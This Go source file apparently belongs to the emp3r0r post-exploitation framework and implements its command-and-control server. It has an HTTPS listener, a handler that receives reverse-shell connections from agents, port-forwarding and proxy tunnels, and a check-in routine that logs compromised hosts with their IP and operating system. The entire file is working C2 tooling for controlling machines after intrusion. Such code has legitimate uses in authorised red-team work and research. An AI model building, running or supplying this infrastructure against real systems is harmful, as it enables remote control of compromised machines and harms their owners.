package cc

import (
	"bytes"
	"context"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

// StreamHandler allow the http handler to use H2Conn
type StreamHandler struct {
	H2x     *agent.H2Conn // h2conn with context
	Buf     chan []byte   // buffer for receiving data
	BufSize int           // buffer size for reverse shell should be 1
}

var (
	// RShellStream reverse shell handler
	RShellStream = &StreamHandler{H2x: nil, BufSize: agent.RShellBufSize, Buf: make(chan []byte)}

	// ProxyStream proxy handler
	ProxyStream = &StreamHandler{H2x: nil, BufSize: agent.ProxyBufSize, Buf: make(chan []byte)}

	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
	PortFwds = make(map[string]*PortFwdSession)
)

// portFwdHandler handles proxy/port forwarding
func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("portFwdHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel
	sh.H2x.Conn = conn

	// record this connection to port forwarding map
	buf := make([]byte, sh.BufSize)
	_, err = conn.Read(buf)
	if err != nil {
		CliPrintError("portFwd connection: handshake failed: %s\n%v", req.RemoteAddr, err)
		return
	}
	buf = bytes.Trim(buf, "\x00")
	sessionID, err := uuid.ParseBytes(buf)
	if err != nil {
		CliPrintError("portFwd connection: handshake failed: %s\n%v", req.RemoteAddr, err)
		return
	}
	// check if session ID exists in the map, if not, this connection cannot be accpeted
	if _, exist := PortFwds[sessionID.String()]; !exist {
		CliPrintError("portFwd connection unrecognized session ID: %s from %s", sessionID.String(), req.RemoteAddr)
		return
	}
	PortFwds[sessionID.String()].Sh = sh // cache this connection
	// handshake success
	CliPrintInfo("Got a portFwd connection from %s", req.RemoteAddr)

	// check if the mapping exists
	pf, exists := PortFwds[sessionID.String()]
	if !exists {
		return
	}

	defer func() {
		err = sh.H2x.Conn.Close()
		if err != nil {
			CliPrintError("portFwdHandler failed to close connection: " + err.Error())
		}
		// cancel PortFwd context
		pf, exists = PortFwds[sessionID.String()]
		if exists {
			CliPrintInfo("portFwdHandler: closing port mapping: %s", sessionID.String())
			pf.Cancel()
		} else {
			CliPrintWarning("portFwdHandler: cannot find port mapping: %s", sessionID.String())
		}
		// cancel HTTP request context
		cancel()
		CliPrintInfo("portFwdHandler: closed portFwd connection from %s", req.RemoteAddr)
	}()

	for ctx.Err() == nil && pf.Ctx.Err() == nil {
		_, exist := PortFwds[sessionID.String()]
		if !exist {
			CliPrintWarning("Disconnected: portFwdHandler: port mapping not found")
			return
		}
		data := make([]byte, sh.BufSize)
		_, err = sh.H2x.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: portFwdHandler read: %v", err)
			return
		}
		sh.Buf <- data
	}
}

// rshellHandler handles buffered data
func (sh *StreamHandler) rshellHandler(wrt http.ResponseWriter, req *http.Request) {
	// check if an agent is already connected
	if sh.H2x.Ctx != nil ||
		sh.H2x.Cancel != nil ||
		sh.H2x.Conn != nil {
		CliPrintError("rshellHandler: occupied")
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("rshellHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel
	sh.H2x.Conn = conn
	CliPrintInfo("Got a reverse shell connection from %s", req.RemoteAddr)

	defer func() {
		err = sh.H2x.Conn.Close()
		if err != nil {
			CliPrintError("rshellHandler failed to close connection: " + err.Error())
		}
		CliPrintWarning("Closed reverse shell connection from %s", req.RemoteAddr)
	}()

	for {
		data := make([]byte, sh.BufSize)
		_, err = sh.H2x.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: rshellHandler read: %v", err)
			return
		}
		sh.Buf <- data
	}
}

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.FileAPI); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.FileAPI, 0700)
		if err != nil {
			log.Fatal("TLSServer: ", err)
		}
	}

	// File server
	http.Handle("/", http.FileServer(http.Dir("/tmp/emp3r0r/www")))

	// Message-based communication
	http.HandleFunc("/"+tun.CheckInAPI, checkinHandler)
	http.HandleFunc("/"+tun.MsgAPI, msgTunHandler)

	// Stream handlers
	var rshellConn, proxyConn agent.H2Conn
	RShellStream.H2x = &rshellConn
	ProxyStream.H2x = &proxyConn
	http.HandleFunc("/"+tun.ReverseShellAPI, RShellStream.rshellHandler)
	http.HandleFunc("/"+tun.ProxyAPI, ProxyStream.portFwdHandler)

	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := http.ListenAndServeTLS(":8000", "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
	if err != nil {
		log.Fatal(color.RedString("Start HTTPS server: %v", err))
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	var target agent.SystemInfo
	jsonData, err := ioutil.ReadAll(req.Body)
	defer req.Body.Close()
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	err = json.Unmarshal(jsonData, &target)
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	// set target IP
	target.IP = req.RemoteAddr

	if !agentExists(&target) {
		inx := len(Targets)
		Targets[&target] = &Control{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-")[0]
		CliPrintSuccess("\n[%d] Knock.. Knock...\n%s from %s, "+
			"running '%s'\n",
			inx, shortname, target.IP,
			target.OS)
	}
}

// msgTunHandler JSON message based tunnel between agent and cc
func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("msgTunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	defer func() {
		for t, c := range Targets {
			if c.Conn == conn {
				delete(Targets, t)
				CliPrintWarning("msgTunHandler: agent [%d]:%s disconnected\n", c.Index, t.Tag)
				break
			}
		}
		err = conn.Close()
		if err != nil {
			CliPrintError("msgTunHandler failed to close connection: " + err.Error())
		}
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg agent.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	for {
		// deal with json data from agent
		err = in.Decode(&msg)
		if err != nil {
			return
		}
		// read hello from agent, set its Conn if needed, and hello back
		// close connection if agent is not responsive
		if msg.Payload == "hello" {
			err = out.Encode(msg)
			if err != nil {
				CliPrintWarning("msgTunHandler cannot send hello to agent [%s]", msg.Tag)
				return
			}
		}

		// process json tundata from agent
		processAgentData(&msg)

		// assign this Conn to a known agent
		agent := GetTargetFromTag(msg.Tag)
		if agent == nil {
			CliPrintWarning("msgTunHandler: agent not recognized")
			return
		}
		Targets[agent].Conn = conn

	}
}
